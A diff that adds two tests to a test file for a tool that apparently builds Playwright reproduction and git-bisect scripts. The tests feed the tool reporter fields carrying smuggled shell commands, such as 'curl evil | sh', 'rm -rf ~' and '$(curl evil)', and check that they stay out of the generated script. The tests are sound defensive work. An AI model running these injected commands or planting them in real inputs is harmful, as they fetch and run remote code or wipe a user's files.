@@ -135,3 +135,22 @@ test('bisect — empty verify command falls back to playwright test', () => {
   if (!result.available) throw new Error('expected available');
   expect(result.bash).toContain('git bisect run npx playwright test');
 });
+
+test('reporter values that are not what they name stay out of the script', () => {
+  const recipe = buildReproRecipe({
+    ...baseInput,
+    commit: 'abc; curl evil | sh #',
+    playwrightVersion: '1.50.0 && curl evil',
+    browserName: 'chromium; rm -rf ~',
+  });
+  const script = reproScript(recipe, 'bash');
+  expect(script).not.toContain('curl');
+  expect(script).not.toContain('rm -rf');
+  expect(script).toContain('npx playwright install\n');
+  expect(recipe.notes.join(' ')).toContain('not a plain revision');
+});
+
+test('no bisect is built from a commit that is not a plain revision', () => {
+  const result = buildBisectScript({ good: 'a1b2c3d', bad: '$(curl evil)', verifyCommand: 'npx playwright test' });
+  expect(result.available).toBe(false);
+});
